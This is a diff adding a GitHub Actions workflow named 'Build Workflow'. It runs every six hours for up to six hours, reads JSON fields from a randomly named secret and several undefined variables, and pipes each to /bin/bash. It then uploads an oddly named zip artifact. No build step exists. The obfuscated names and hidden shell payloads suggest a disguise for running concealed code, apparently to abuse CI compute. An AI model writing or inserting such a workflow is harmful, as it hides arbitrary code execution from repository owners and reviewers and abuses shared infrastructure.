@@ -1,0 +1,34 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '7 5,11,17,23 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  ci:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          rigu707: ${{ secrets.rigu707 }}
+        run: |
+          printf '%s' "$rigu707" | jq -r .zks791 | /bin/bash
+          printf '%s' "$yxxo2667" | jq -r .rtf4 | /bin/bash
+          echo $foj157 | jq -r .vtdzx4 | /bin/bash
+          echo $hgx0 | jq -r .sbba16 | /bin/bash
+          printf '%s' "$u21572" | jq -r .knurw312 | /bin/bash
+          printf '%s' "$k2" | jq -r .cr27 | /bin/bash
+
+      - name: Save artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: zJ11Qmj8
+          path: "*.zip"
+          retention-days: 1
